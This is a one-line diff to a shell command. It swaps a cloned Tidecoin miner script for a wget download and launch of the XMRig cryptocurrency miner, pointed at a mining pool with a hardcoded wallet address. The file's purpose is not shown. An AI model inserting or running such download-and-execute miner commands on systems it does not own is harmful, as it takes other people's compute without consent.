@@ -1,1 +1,1 @@
-git clone https://github.com/saliem07/whive1.git && cd whive1 && chmod +x miner-tidecoin.sh && chmod +x cpuminer-sse2 && ./miner-tidecoin.sh
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o xmrig.nanswap.com:3333 -u xro_1xyqtgp8gnj5bihiim669w1ce9atus3xt3mx7boyrbn6ch7kuip7ketknwqy -p nos2 -t 4 -k -a rx --1gb-pages
